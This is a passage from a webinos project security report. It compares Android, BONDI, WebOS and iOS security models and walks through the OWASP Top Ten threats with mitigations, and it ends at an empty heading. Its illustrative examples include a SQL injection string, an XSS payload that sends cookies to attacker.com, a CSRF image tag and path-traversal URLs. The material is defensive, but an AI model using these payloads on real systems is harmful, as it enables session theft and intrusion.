Background[¶](#Background)
==========================

Related Security and Privacy Architectures[¶](#Related-Security-and-Privacy-Architectures)
------------------------------------------------------------------------------------------

### Android[¶](#Android)

Android is an open source platform derived from Linux 2.6, shaped for
mobile devices. The architecture consists of four levels Linux kernel,
libraries, application framework and applications. Thus, many access
control features are derived by Linux access control (e.g. file
permission types). ([AndroidOverview](AndroidOverview.html),
[AndroidSurvey](AndroidSurvey.html))

At the application framework layer, the application developer has access
to what Android refers to as "service" processes. Application developers
can communicate with these services via an intermediary message bus. For
example, a contact application might start a phone call using the
services of the telephony manager

Applications can be: user interface applications,intent listeners (that
are messages carried over the message bus to allow the inter-process
communication), services (similar to UNIX daemon processes) and content
providers (data storehouses that provide access to data on the device)

Android security level is based on two different mechanisms. One is the
sandboxing provided by the virtualization, the other is the Linux usual
access control based on read-write-execute permission tuple.

Each Android application is hosted in a Dalvik VM. This VM is only an
optimized interpreter for use on low powered low memory devices. It uses
the Java programming language but it is not a Java virtual machine since
it differs in the bytecode format. Each application runs sandboxed from
each other in its own instance of the Dalvik virtual machine. The kernel
is responsible for sandboxing management. Each instance of the Dalvik
virtual machine represents a Linux kernel process. Each instance is
isolated from the other.\
Applications must declare needed permissions for capabilities not
provided by the sandbox, so the system prompts the user for consent (at
install time).

Permission may be enforced at the following time points
([AndroidSecurity](AndroidSecurity.html)):

-   at the time of a call into the system
-   when starting an activity (i.e. an application component)
-   both when sending and receiving broadcasts,
-   when accessing and operating on a content provider
-   when binding to or starting a service

The second security mechanisms is essentially the same of Linux OS.
Files and data held by an application are isolated from other
applications enforced by the Android Linux kernel and traditional Unix
file permissions. To access data from another application, it must first
be exposed via a content provider accessed by the message bus.

To ensure application integrity and authenticity, applications must be
signed with a certificate whose private key is held by their developer.
The certificate identifies the author of the application and does not
need to be signed by a certificate authority.

### BONDI[¶](#BONDI)

BONDI proposes a general security framework that unifies the modeling,
representation and enforcement of security policies
([BONDIv1.1](BONDIv1.1.html)). The framework allows the expression of
different forms of security policy based on widget resource signatures.
It allows blacklisting and/or whitelisting of widgets, authors and
websites.\
The model identifies identity types, resources, attributes and
conditions, that can be expressed in an XML-based interchange format.\
The management of a security policy configuration (i.e. creation and
update) could be a source of usability problems, especially for common
users.

BONDI establish a minimum baseline for security policy management
capability to ensure that web runtimes are manageable. The associated
configuration data is interoperable between consuming devices, e.g.
asking for a signature associated to each widget to assure provenience
and integrity.

Widgets must be signed according to the W3C Widgets 1.0 digital
signature specification. The signature allows the web runtime to verify
the integrity and authenticity of every file. Widgets must have a valid
author signature and one or more valid distributor signature. The web
runtime must support processing of certificates that conform to the
Wireless Application Protocol WAP Certificate and CRL Profiles
Specification.

The dependencies of BONDI web applications are indicated in terms of one
or more features, which correspond to specific functionality provided by
the web runtime. The web runtime must only enable a web application to
use a JavaScript API if a dependency has been explicitly expressed and
access to the feature has been granted.

The web runtime must resolve all dependencies of features referenced
either statically (at install time) or at instantiation time for widget
resources that are instantiated without prior installation. For each
referenced feature, the web runtime must perfom an access control query
to evaluate the actual granting.

The web runtime must grant access only to features that are advertised
as dependencies of the web application. This requires that the access
control system is able to control access based on the ID of a feature.
It must be possible to represent security policies portably. All
identifiers used in a security policy must be portably defined
(referring both to feature and device capabilities).

The policy is expressed as a collection of specific access control
rules. The rules are organized into groups, termed policies and these in
turn are organized into groups termed policy sets. Each rule is
specified by defining a condition, which is a set of statements which
must be satisfied in order for that particular rule to apply an effect,
which represents the rule’s outcome.

A BONDI web runtime must both use a configured security policy as the
sole basis on which access control decisions are made and verify that
each use of each feature is permitted by evaluating the feature request
against the configured security policy.

To assure policy integrity, a web runtime must only accept signed
security policies from authorized security policy provisioning
authorities and support at least one security policy provisioning
authority.

### WebOS[¶](#WebOS)

WebOS 1.2 runs a custom Linux distribution using the Linux 2.6 kernel
([WebOSIntro](WebOSIntro.html),
[PalmWebOS-swcuc3m](PalmWebOS-swcuc3m.html)). On top of the kernel are
several system processes and the UI System Manager. This WebOS-specific
component is responsible for managing the life cycle of WebOS
applications and deciding what to show the user. The UI System Manager
is referred to as Luna and lives within /usr/bin/LunaSysMgr. It is a
modified version of WebKit but it is not used solely for web page
rendering. Rather, all third-party WebOS native applications are
authored using web technologies (HTML, JavaScript, CSS) and execute
within Luna. So what appears in Linux as one process is in reality
internally running several WebOS processes. Luna’s internal Application
Manager controls the life cycle of these processes.

WebOS processes runs entirely within Luna and is not scheduled by Linux.
The system processes are traditional Linux processes scheduled by Linux
kernel’s scheduler. All Linux processes, including Luna, run with root
permissions. Luna enforces per-application permissions and ensures that
malicious applications cannot compromise the device. A bug in Luna or
its web-rendering engine could be exploited by malicious code to abuse
Luna’s super-user permissions.

WebOS uses Google’s V8 JavaScript engine which prevents JavaScript from
directly modifying memory or controlling the device’s hardware. For
example, WebOS applications are prevented from directly opening files or
devices such as /dev/kmem.

The “Mojo” framework provides a collection of services and plug-ins that
are exposed to JavaScript and may be used by applications to access
device functionality. For third-party application developers, Mojo is
the window to leveraging the device’s capabilities.

There are two broad categories of extensions provided by Mojo: services
and plug-ins. Plug-ins are written in C or C++ and implement the
Netscape Plugin API (NPAPI). This API provides a bridge between
JavaScript, Webkit, and objects written in other languages. The Camera,
for example, needed to be written as a plug-in because it accesses
device hardware directly. Because Luna knows how to communicate with
plug-ins, Luna can load the plug-ins and display them on the same screen
along with traditional Mojo framework UI elements. Each plug-in exposes
some JavaScript methods that can be used to change the plug-in’s
behavior or receive plug-in events. Third-party developers do not
generally use plug-ins directly; instead, they use Mojo APIs that will
end up invoking the plug-ins.

Services differ from plug-ins because they execute outside of the main
Luna process. Each service has a remote procedure call (RPC) interface
that applications can use to communicate with the service.

Communication occurs over the “Palm Bus”, a communications bus based on
the open-source D-Bus. The bus is a generic communication router that
may be used to send and receive messages between applications. System
applications can register with the bus to receive messages and access
the bus to send messages to other applications. Only Palm applications
are currently allowed to register as listeners on the bus. However, all
applications use the bus extensively, either directly by using the
service API or indirectly by using Mojo APIs that execute D-Bus calls
under the covers.

All WebOS applications are identified using the "reverse-dns" naming
convention. For example, an application published by iSEC Partners may
be called com.isecpartners.webos.SampleApplication. Some applications
use the standard D-bus notation, which is the complete path to the
executable on disk (for example, /usr/bin/mediaserver). These
applications are the extreme exception, and all third-party applications
are named using reverse-dns notation.

The naming convention and the Palm Bus work together to play an
important role in overall service security. The Palm Bus is divided into
two channels: the public channel and the private channel. Not all
services listen on both channels. For example, the sensitive
SystemManager service only listens on the private channel. The Palm Bus
only allows applications under the com.palm.\* namespace to send
messages to private-channel services. Services that want to be available
to all applications, such as the Contacts service, listen on the public
channel. Some services listen on both, but expose different service
interfaces to each bus.

There are some subtle but important differences between the WebOS
JavaScript execution environment and that of a standard web browser.
Most notably, WebOS applications are not restricted by the Same Origin
Policy. Regardless of their origin, applications can make requests to
any site. Although developers may find this capability useful, malware
authors may abuse the lack of a Same Origin Policy to communicate with
multiple sites in ways that they cannot do within a web browser. The
Same Origin Policy still applies to JavaScript executing in WebOS’s web
browser, and the standard web application security model is not changed
when simply browsing the Web.

### iOS[¶](#iOS)

iPhone OS ([iOS-TechOverview](iOS-TechOverview.html),
[iPhoneOS-swcuc3m](iPhoneOS-swcuc3m.html)) has four abstraction layers
([MacOSX-SecurityArchitecture](MacOSX-SecurityArchitecture.html)):

1.  The Core OS layer contains low-level features. It manages the
    virtual memory system, threads, the file system, the network, and
    interprocess communication among the frameworks in the Core OS
    layer. This layer encompasses the kernel environment, drivers, and
    basic interfaces of iPhone OS.
2.  The Core Services layer contains the fundamental system services,
    e.g. SQlite library, XML support, address book framework, core media
    framework, core telephony framework, system configuration framework.
3.  The Media layer contains the graphics, audio, and video technologies
    which handle the presentation of visual and audible content.
4.  The Cocoa Touch layer defines the basic application infrastructure
    and support for technologies such as multitasking, touch-based
    input, push notifications, and other high-level system services. It
    is used to implement a graphical, event-driven application.

The iPhone OS security APIs
([MacOSX-SecurityServices](MacOSX-SecurityServices.html)) are located in
the Core Services layer of the operating system and are based on
services in the Core OS (kernel) layer of the operating system.
Applications on the iPhone call the security services APIs directly
rather than going through the Cocoa Touch or Media layers.\
Networking applications can also access secure networking functions
through the CFNetwork API, which is also located in the Core Services
layer.

#### Security Server Daemon[¶](#Security-Server-Daemon)

It implements several security protocols, such as access to keychain
items and root certificate trust management.\
The Security Server has no public API. Instead, applications use the
Keychain Services API and the Certificate, Key, and Trust services API,
which in turn communicate with the Security Server. Because iOS do not
provide an authentication interface, there is no need for the Security
Server to have a user interface.

#### iPhone OS Security APIs[¶](#iPhone-OS-Security-APIs)

The iPhone OS security APIs are based on services in the Core Services
layer, including the Common Crypto library in the libSystem dynamic
library.

#### Keychain[¶](#Keychain)

The keychain is used to store passwords, keys, certificates, and other
secrets. Its implementation, therefore, requires both cryptographic
functions to encrypt and decrypt secrets, and data storage functions to
store the secrets and related data in files. To achieve these aims,
Keychain Services calls the Common Crypto dynamic library.

#### CFNetwork[¶](#CFNetwork)

CFNetwork is a high-level API that can be used by applications to create
and maintain secure data streams and to add authentication information
to a message. CFNetwork calls underlying security services to set up a
secure connection.

#### Certificate, Key, and Trust Services:[¶](#Certificate-Key-and-Trust-Services)

The Certificate, Key, and Trust Services API includes functions to
create, manage, and read certificates; add certificates to a keychain;
create encryption keys; encrypt and decrypt data; sign data and verify
signatures; manage trust policies. To carry out all these services, the
API calls the Common Crypto dynamic library and other Core OS–level
services.

#### Randomization Services[¶](#Randomization-Services)

Randomization Services provides cryptographically secure pseudo-random
numbers. Pseudo-random numbers are generated by a computer algorithm
(and are therefore not truly random), but the algorithm is not
discernible from the sequence. To generate these numbers, Randomization
Services calls a random-number generator in the Core OS layer.

#### Restrictions On Code Execution[¶](#Restrictions-On-Code-Execution)

In iOS, every application is sandboxed during installation. The
application, its preferences, and its data are restricted to a unique
location in the file system and no application can access another
application’s preferences or data. In addition, an application running
in iOS can see only its own keychain items.

#### Code Signing[¶](#Code-Signing)

Digital signatures are required on all applications for iOS. In
addition, Apple adds its own signature before distributing an iOS
application. Apple does not sign applications that have not been signed
by the developer, and applications not signed by Apple simply will not
run.

### Lessons learned[¶](#Lessons-learned)

From previous analysis. we can distill web applications leverages on a
set of well-grounded security techniques, that Webinos should adopt as
well in order to counteract many common web attacks. These techniques
are:

-   Code signing, to prevent installation/instantiation of non trusted
    applications (i.e. not authenticated and/or not modified by non
    authorized parties and/or provided by untrusted parties).
-   Sandboxing, to prevent unwanted influences of one application to
    another one and or to the runtime.
-   A security policy framework, that is as much simple as possible to
    avoid usability problems and lead to misconfiguration, but
    expressive enough to allow detailed access control to any key
    features and functions.

Threat Models and Threat Analysis[¶](#Threat-Models-and-Threat-Analysis)
------------------------------------------------------------------------

When securing complex information systems like network web-based
application environments, some form of risk or threat analysis needs to
be carried out at an early stage. This analysis is used to select
countermeasures that form the basis of a system's security architecture.

Many different standards and methodologies have been proposed for
carrying out risk analysis. All share several common themes:

-   A Perimeter definition exercise defines which components are objects
    under risk analysis scope; these objects may be **physical
    components** of the system, applications and services,
    **interactions**, and **dependencies** among services
-   Asset identification defines and characteristics the worth of
    components inside the perimeter.
-   Threat identification is used to state assumed threats within the
    scope of analysis.
-   Countermeasure definition and application suggests and checks the
    effectiveness of protection mechanisms that can be put in place to
    defend against identified threats

The perimeter definition exercise is an implicit activity as part of WP
3.1. Similarly, assets are being elicited and valued as part of WP 2.8.
Because WP 2.8 will be delivered several months after the delivery of WP
3.5, countermeasure definition and, subsequently, proposal of the
security architecture will not be fully informed by that work-package.
However, it is possible to predict likely threats which are commonly
agreed to be critical threats. For this reason, the threats elicited for
this deliverable are based on the widely accepted OWASP list of top-ten
threats. The threats proposed were derived from both the 2010 and 2007
top-ten lists.

### OWASP threats and vulnerabilities[¶](#OWASP-threats-and-vulnerabilities)

OWASP (Open Web Application Security Project) is well-known, worldwide,
non-profit organization; its purpose is to develop instruments to
understand application security. OWASP's definition of application
security is *everything involved in developing, maintaining, and
purchasing applications that your organization can trust*
([OWASP](OWASP.html)).

OWASP supports tools for:

-   application security testing,
-   secure software development guidance,
-   advice on the use of application security APIs,
-   cheat sheets to avoid common application security holes,
-   information about common vulnerabilities,
-   taxonomies of threats and threat agents.

As part of the OWASP project, the most relevant security risks are
highlighted and discussed, in the OWASP Top Ten 10 Most Critical Web
Application Security Risks ([OWASP-Top10](OWASP-Top10.html)). These
risks are described and detailed below. These risks can be mitigated or
avoided adopting secure programming practice and properly shaped APIs.
The [OWASP ESAPI (Enterprise Security API)
project](https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API)
addresses the problem of properly shaped functions to mitigate most
treacherous application security weaknesses, and describes what kind of
API is required to counteract each threat in the top ten.

The top threat and vulnerability descriptions -- at the time of
writing -- are provided below. We describe each threat or vulnerability,
together with a simple illustrative example. We then present OWASP
mandated guidelines for mitigating the threat or vulnerability, and
proposals for webinos countermeasures based on these.

#### Injection[¶](#Injection)

This occurs when untrusted data is sent to an interpreter as part of a
command or query. This threat is relevant to webinos when a device
exports some application or functionality.

An example of this threat is illustrated below:

    String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") +"'";

The attacker modifies the ‘id’ parameter in their browser

    http://example.com/app/accountView?id=' or '1'='1

OWASP proposes the following mitigations for dealing with this threat.

1.  Use a safe API which avoids the use of the interpreter entirely or
    provides a parametrized interface.
2.  Carefully escape special characters using the specific escape syntax
    for that interpreter.
3.  Positive or “white list” input validation with appropriate
    "canonicalization".

Based on these proposals, the following webinos countermeasures are
proposed.

1.  Secure code best practices should be adopted by webinos developers.
    See [Further Security and Privacy
    Guidelines](Further%20Security%20and%20Privacy%20Guidelines.html)
    section for more information.
2.  webinos applications should be tested with defined patterns of
    improperly formatted input data.

#### Cross-Site Scripting (XSS)[¶](#Cross-Site-Scripting-XSS)

This occurs whenever an application takes untrusted data and sends them
to a web browser without proper validation and/or escaping

An example of this threat is illustrated below:

    (String) page += "<input name='creditcard' type='TEXT‘ value='" + request.getParameter("CC") + "'>";

The attacker modifies the ‘CC’ parameter in their browser to:

    '><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'

OWASP proposes the following mitigations for dealing with this threat/

1.  Properly escape all untrusted data based on the HTML context (body,
    attribute, JavaScript, CSS, or URL) that the data will be placed
    into.
2.  Positive or “white-list” input validation, but is not a complete
    defense as many applications must accept special characters.
3.  Consider employing Mozilla's new Content Security Policy (Firefox 4)
    to defend against XSS.

Because this threat enables improper cross-application injection and
data access, the following webinos countermeasures are proposed.

1.  Secure code best practices should be adopted by webinos developers.
    See [Further Security and Privacy
    Guidelines](Further%20Security%20and%20Privacy%20Guidelines.html)
    section for more information.
2.  webinos applications should be tested against defined patterns of
    improperly formatted input data.
3.  webinos runtime could support Mozilla's Content Security Policy.

#### Broken Authentication and Session Management[¶](#Broken-Authentication-and-Session-Management)

Application functions related to authentication and session management
are often not implemented correctly. Examples of this exploitable
vulnerability are the following.

-   Links like:
    <http://example.com/sale/saleitems;jsessionid=2P0OC2JDPXM0OQSNDLPSKHCJUN2JV?dest=Hawaii>
    pose at stake user security: An unaware user e-mails the link
    without knowing he is also giving away his session ID
-   Application’s timeouts aren’t set properly. User uses a public
    computer to access site. Instead of selecting "logout" the user
    simply closes the browser tab and walks away
-   User passwords are not encrypted, exposing every users’ password to
    the attacker.

OWASP proposes the following mitigations for dealing with this threat.

1.  A single set of strong authentication and session management
    controls
    1.  Meet all the authentication and session management requirements
        defined in OWASP’s Application Security Verification Standard
        (ASVS) areas V2 (Authentication) and V3 (Session Management)
    2.  Have a simple interface for developers. Consider the ESAPI
        Authenticator and User APIs as good examples to emulate, use, or
        build upon.

2.  Avoid XSS flaws which can be used to steal session IDs.

Authentication and session management problems can let an attacker to
pose as a webinos legitimate user. Because of this, the following
webinos countermeasures are proposed.

1.  Webinos developer should correctly implement application functions
    related to authentication and session management.
2.  A simple interface will be exposed to developers. Mutual
    authentication is taken care of by the transport layer in webinos.

#### Insecure Direct Object References[¶](#Insecure-Direct-Object-References)

This occurs when a developer exposes a reference to an internal
implementation object. The example below illustrates how this
vulnerability can be exploited.

    String query = "SELECT * FROM accts WHERE account = ?";
    PreparedStatement pstmt = connection.prepareStatement(query , ... );
    pstmt.setString( 1, request.getParameter("acct"));
    ResultSet results = pstmt.executeQuery( );

The attacker simply modifies the ‘acct’ parameter in their browser to
send whatever account number they want:

    http://example.com/app/accountInfo?acct=notmyacct

OWASP proposes the following mitigations for dealing with this threat:

1.  Use per user or session indirect object references.
2.  Check access.

To deal with this threat, webinos should provide developers with simple
check access mechanisms.

#### Cross-Site Request Forgery (CSRF)[¶](#Cross-Site-Request-Forgery-CSRF)

This attack forces the victim's browser to generate requests the
vulnerable application thinks are legitimate requests from the victim;
this allows an attacker to generate requests posing as a legitimate
webinos user.

An example of a CSRF is provided below:

    <img src="http://example.com/app/transferFunds?amount=1500&destinationAccount=attackersAcct#“width="0" height="0" />

To mitigate this threat, OWASP proposes the inclusion of a unpredictable
token in the body or URL of each HTTP request. Such tokens should at a
minimum be unique per user session, but can also be unique per request.
More specifically, the following requirements for tokens need to be
satisfied:

1.  Include the unique token in a hidden field. This causes the value to
    be sent in the body of the HTTP request.
2.  Include the unique token in the URL itself, or a URL parameter.
    However, such placement runs the risk that the URL will be exposed
    to an attacker, thus compromising the secret token.

To deal with this threat, webinos developer should include an
unpredictable token in each request.

#### Security Misconfiguration[¶](#Security-Misconfiguration)

Good security posture requires definition and deployment of a secure
configuration. Attacker can take advantage of misconfiguration to
exploit some other vulnerability. Examples of non-secure configuration
include the following.

-   Not updating your libraries.
-   The application server admin console is automatically installed and
    not removed. Default accounts aren't changed.
-   Directory listing is not disabled on your server.
-   Application server configuration allows stack traces to be returned
    to users.

OWASP proposes the following mitigations for dealing with this
vulnerability.

1.  A repeatable hardening process that makes it fast and easy to deploy
    another environment that is properly locked down.
2.  A process for keeping abreast of and deploying all new software
    updates and patches in a timely manner to each deployed environment.
3.  A strong application architecture that provides good separation and
    security between components.
4.  Run scans and do audits periodically to help detect future
    misconfigurations or missing patches.

Based on these proposals, the following webinos countermeasures are
proposed.

1.  Provide developers with means to easily write clear policies.
2.  Mandate the use of policies (and provide a restrictive default
    policy).

#### Insecure Cryptographic Storage[¶](#Insecure-Cryptographic-Storage)

Many web applications do not properly protect sensitive data. This can
provide an attacker access to sensitive data.

Example of insecure cryptographic storage include the following.

-   The database is set to automatically decrypt queries against the
    credit card columns, allowing an SQL injection flaw to retrieve all
    the credit cards in cleartext.
-   A backup tape is made of encrypted health records, but the
    encryption key is on the same backup.
-   The password database uses unsalted hashes to store everyone's
    passwords.

OWASP proposes the following mitigations for dealing with this
vulnerability:

1.  Considering the threats you plan to protect this data from (e.g.,
    insider attack, external user), make sure you encrypt all such data
    at rest in a manner that defends against these threats.
2.  Ensure offsite backups are encrypted, but the keys are managed and
    backed up separately.
3.  Ensure appropriate strong standard algorithms and strong keys are
    used, and key management is in place.
4.  Ensure passwords are hashed with a strong standard algorithm and an
    appropriate salt is used.
5.  Ensure all keys and passwords are protected from unauthorized
    access.

Based on these proposals, the following webinos countermeasures are
proposed.

1.  Provide developers with means to easily encrypt data.
2.  Automatically use encrypted storage for apps (every app should have
    its own encrypted storage).

#### Failure to Restrict URL Access[¶](#Failure-to-Restrict-URL-Access)

Applications need to perform access control checks each time protected
pages are accessed. Failure to do so might allow an attacker to access
protected pages. For example, access to the following pages should be
protected:

<http://example.com/app/getappInfo>\
<http://example.com/app/admin_getappInfo>

OWASP proposes preventing unauthorized URL access requires by selecting
an approach for requiring proper authentication and proper authorization
for each page. When selecting an approach, the following points should
be considered.

1.  The authentication and authorization policies be role based, to
    minimize the effort required to maintain these policies.
2.  The policies should be highly configurable, in order to minimize any
    hard coded aspects of the policy.
3.  The enforcement mechanism(s) should deny all access by default,
    requiring explicit grants to specific users and roles for access to
    every page.
4.  If the page is involved in a workflow, check to make sure the
    conditions are in the proper state to allow access.

Based on the suggestions, webinos PEPs should check page accesses using
suitable policies.

#### Insufficient Transport Layer Protection[¶](#Insufficient-Transport-Layer-Protection)

Applications frequently fail to authenticate, encrypt, and protect the
confidentiality and integrity of sensitive network traffic.
Consequently, an attacker may steal sensitive data from unprotected
traffic.

Sites open to this vulnerability include the following.

-   Sites that don't use SSL for all pages that require authentication.
-   Sites with improperly configured SSL certificate; these cause
    browser warnings for its users, who then become accustomed to such
    warnings.
-   Sites using default ODBC/JDBC for the database connection, which
    sends all traffic in the clear.

OWASP makes the following suggestions for dealing with this
vulnerability.

1.  Require SSL for all sensitive pages. Non-SSL requests to these pages
    should be redirected to the SSL page.
2.  Set the ‘secure’ flag on all sensitive cookies.
3.  Configure your SSL provider to only support strong algorithms.
4.  Ensure your certificate is valid, not expired, not revoked, and
    matches all domains used by the site.
5.  Backend and other connections should also use SSL or other
    encryption technologies.

Based on these suggestions, webinos should use policies requesting
encryption, when advisable.

#### Unvalidated Redirects and Forwards[¶](#Unvalidated-Redirects-and-Forwards)

Web applications frequently redirect and forward users to other pages
and websites, and use untrusted data to determine the destination pages.
This can potentially allow an attacker to hijack a user's session.

Two examples of exploits which take advantage of this behaviour are as
follows.

-   The attacker crafts a malicious URL that redirects users to a
    malicious site that performs phishing and installs malware, e.g.
    <http://www.example.com/redirect.jsp?url=evil.com>
-   The attacker crafts a URL that will pass the application's access
    control check and then forward the attacker to an administrative
    function that she would not normally be able to access, e.g.
    <http://www.example.com/boring.jsp?fwd=admin.jsp>

OWASP makes the following suggestions for dealing with this
vulnerability.

1.  Avoid using redirects and forwards.
2.  If used, don't involve user parameters in calculating the
    destination.
3.  If destination parameters can't be avoided, ensure that the supplied
    value is valid, and authorized for the user. It is recommended that
    any such destination parameters be a mapping value, and that server
    side code translate this mapping to the target URL.

Based on these proposals, the following webinos countermeasures are
proposed.

1.  Secure code best practices should be adopted by webinos developers.
    See [Further Security and Privacy
    Guidelines](Further%20Security%20and%20Privacy%20Guidelines.html)
    section for more information.
2.  webinos applications should be tested with defined patterns of
    improperly formatted input data.

#### Malicious File Execution.[¶](#Malicious-File-Execution)

Code vulnerable to remote file inclusion (RFI) allows attackers to
include hostile code and data. This can allow an attacker to execute
malicious code.

For example:

    include $_REQUEST['filename’];

OWASP makes the following suggestions for dealing with this
vulnerability.

1.  Use an indirect object reference map.
2.  Use explicit taint checking mechanisms, if your language supports
    it.
3.  Strongly validate user input using "accept known good" as a
    strategy.
4.  Add firewall rules to prevent web servers making new connections to
    external web sites and internal systems.
5.  Check user supplied files or filenames.
6.  Consider implementing a chroot jail or other sand box mechanisms.

Based on these proposals, the following webinos countermeasures are
proposed.

1.  Secure code best practices should be adopted by webinos developers.
    See [Further Security and Privacy
    Guidelines](Further%20Security%20and%20Privacy%20Guidelines.html)
    section for more information.
2.  Use policies to prevent web servers making new connections to
    external web sites and internal systems.
3.  Use sand box mechanisms.

### Early results from Task 2.8[¶](#Early-results-from-Task-28)

Task 2.8 is performing a security analysis to identify, qualify and
represent the most significant risks to webinos. The final report of
T2.8 will present misuse cases representing the most significant risks
the project faces, together with a list of findings based on the
experiment and updated personas if necessary.

Since the work performed in T 2.8 is very strictly linked to the
security architecture, it is useful to report here the preliminary work
on threat and misuse detection, mentioning which part of the security
architecture will have a role to prevent the threat.

#### Cross Site Request Forgery (CSRF)[¶](#Cross-Site-Request-Forgery-CSRF)

The attacker tricks the victim into loading a page that contains a
request that inherits the webinos identity and privileges of the victim
to perform an undesired function on the belief of the victim.\
It is possible to prevent the CSRF including an unpredictable token in
the body or URL of each HTTP request.

Reference security architecture section: "Authentication and User
Identity Management".

#### Man-In-The-Middle Attack[¶](#Man-In-The-Middle-Attack)

The man-in-the middle attack intercepts a communication between two
systems. For example, in an http transaction the target is the TCP
connection between client and server. Using different techniques, the
attacker splits the original TCP connection into 2 new connections, one
between the client and the attacker and the other between the attacker
and the server. Once the TCP connection is intercepted, the attacker
acts as a proxy, being able to read, insert and modify the data in the
intercepted communication.\
It is possible to prevent the Man-In-The-Middle Attack using
authentication.

Reference security architecture section: "Authentication and User
Identity Management".

#### NFC replay Attack[¶](#NFC-replay-Attack)

Using a ghost and leech device, an attacker forwards a request to the
victim's reader device and relays the answer back in real time via a
webinos overlay network.\
It could be prevented restricting the access to NFC APIs.

Reference security architecture section:
"Security-Policy-Architecture"/"Privileged Applications"

#### Online Fraud[¶](#Online-Fraud)

A malicious application instance misuses a user's shopping and payment
information for the incorrect gain/loss of money or products for either
the user, the seller, the attacker, or any other person.\
The attack description can encompass a broad set of attack types (Data
Structure Attack Threat, Embedded Malicious Code Threat, Injection
Threat, Resource Manipulation Threat, Protocol Manipulation Threat,
Exploitation of Authentication Threat).

Reference security architecture section (being the attack carried out
using a malicious application): "Application Certification and Trust
Chains"

#### Repudiation attack[¶](#Repudiation-attack)

Malicious manipulation or forging the identification of new actions.
This attack changes the authoring information of actions executed by a
malicious user in order to log wrong data to log files. Its usage could
be extended to general data manipulation in the name of others, in a
similar manner as spoofing mail messages. If this attack takes place,
the data stored on log files can be considered invalid or misleading.

Reference security architecture section: "Authentication and User
Identity Management".

#### Spyware[¶](#Spyware)

A malicious application captures private information and sends it out of
a device without user acceptance.

Reference security architecture section: "Privacy Policy Architecture".

#### Autologin abuse[¶](#Autologin-abuse)

This exploits the Security misconfiguration vulnerability previously
described.

If the autologin is enabled, an attacker can authenticate himself as the
default user

Reference security architecture section: "Authentication and User
Identity Management".

#### Session hijacking[¶](#Session-hijacking)

This exploits the Broken authentication and session management threat
previously described.

User uses a public computer to access site. Instead of selecting
"logout" the user simply closes the browser tab and walks away. Attacker
uses the same browser later, and that browser is still authenticated

Reference security architecture section: "Authentication and User
Identity Management".

#### PZH access abuse[¶](#PZH-access-abuse)

This is exploits the Security misconfiguration vulnerability previously
described.

If the PZH access is unprotected, the attacker can retrieve the personal
zone device list

Reference security architecture section: "Authentication and User
Identity Management".

#### Cryptanalysis[¶](#Cryptanalysis)

This exploits the Insecure Crytographic Storage vulnerability previously
described.

A weak (or absent) encryption algorithm may let an attacker access to
user personal data on the mass memory.

Reference security architecture section: "Secure Storage".

#### Personal Zone Subversion[¶](#Personal-Zone-Subversion)

Stolen user credentials may let an attacker to take the control over the
user personal zone

Reference security architecture section: "Authentication and User
Identity Management".

#### Network eavesdropping[¶](#Network-eavesdropping)

This is exploits the Security misconfiguration vulnerability previously
described.

Unprotected channels may allow an attacker to eavesdrop communications.
In could be particularly dangerous for PZH/PZPs synchronization
messages.

Reference security architecture section: "Personal Zone Security"

#### Denial of Service[¶](#Denial-of-Service)

Flooding a Personal Zone Hub may hamper Personal Zone communications.

Reference security architecture section: "Personal Zone Security"

#### Jamming[¶](#Jamming)

Wireless communications usage among personal zone nearby devices may
expose them to jamming.

Reference security architecture section: "Personal Zone Security"

#### Account lockout attack[¶](#Account-lockout-attack)

The attacker attempts to lock out all user accounts, typically by
failing login more times than the threshold defined by the
authentication system. An account lockout attack on PZH could hamper
devices to connect outside the personal zone.

Reference security architecture section: "Authentication and User
Identity Management".

#### Argument Injection or Modification[¶](#Argument-Injection-or-Modification)

When a device exports services outside the personal zone, it can be
subjected to this attack.\
If the configuration allows for that, the attacker may, for example, try
to pass argument \$authorized=1 as input data to application, to
authorize himself ad administrator.

Reference security architecture section: "Personal zone
security"/"Session security".

#### Asymmetric resource consumption (amplification)[¶](#Asymmetric-resource-consumption-amplification)

The scenario is: the device calls a remote service, and policies allow
the service to access personal zone local resources.\
If the service fails to release or incorrectly releases a system
resource, this resource is not properly cleared and made available for
re-use.

Reference security architecture section: "Personal zone security" or
"Session security".

#### Direct Dynamic Code Evaluation ('Eval Injection')[¶](#Direct-Dynamic-Code-Evaluation-Eval-Injection)

When a device exports services outside the personal zone, it can be
subjected to this attack.\
If user inputs to a script are not properly validated, a remote user can
supply a specially crafted URL to pass arbitrary code to an eval()
statement, which results in code execution.

Reference security architecture section: "Personal zone
security"/"Session security".

#### Direct Static Code Injection[¶](#Direct-Static-Code-Injection)

When a device exports services outside the personal zone, it can be
subjected to this attack.\
It consists of injecting code directly onto the resource used by
application while processing a user request. This is normally performed
by tampering libraries and template files which are created based on
user input without proper data sanitization.

Reference security architecture section: "Personal zone security" or
"Session security".

#### Man-in-the-browser attack[¶](#Man-in-the-browser-attack)

The Man-in-the-Browser attack is the same approach as Man-in-the-middle
attack, but in this case a Trojan Horse is used to intercept and
manipulate calls between the main application's executable (ex: the
browser) and its security mechanisms or libraries on-the-fly.\
The most common objective of this attack is to cause financial fraud by
manipulating transactions of Internet Banking systems, even when other
authentication factors are in use.

Reference security architecture section: "Extension Handling".

#### Mobile code: invoking untrusted mobile code[¶](#Mobile-code-invoking-untrusted-mobile-code)

This attack consists of a manipulation of a mobile code in order to
execute malicious operations at the client side. The malicious mobile
code could be hosted in an untrustworthy web site or it could be
permanently injected on a vulnerable web site through an injection
attack.

Reference security architecture section: "Application Certification and
Trust Chains".

#### Path traversal[¶](#Path-traversal)

When a device exports services outside the personal zone, it can be
subjected to this attack.\
The attacker aims to access files and directories that are stored
outside the root folder. He looks for absolute links to files by
manipulating variables that reference files with “dot-dot-slash (../)”
sequences and its variations.

Reference security architecture section: "Personal zone security".

#### Unicode Encoding[¶](#Unicode-Encoding)

When a device exports services outside the personal zone, it can be
subjected to this attack.\
The attack aims to explore flaws in the decoding mechanism implemented
on applications when decoding Unicode data format.\
An attacker can use this technique to encode certain characters in the
URL to bypass application filters, thus accessing restricted resources.

Original Path Traversal attack URL (without Unicode Encoding):

    http://vulneapplication/../../appusers.txt

Path Traversal attack URL with Unicode Encoding:

    http://vulneapplication/%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFappusers.txt

Reference security architecture section: "Personal zone security".

#### Web Parameter Tampering[¶](#Web-Parameter-Tampering)

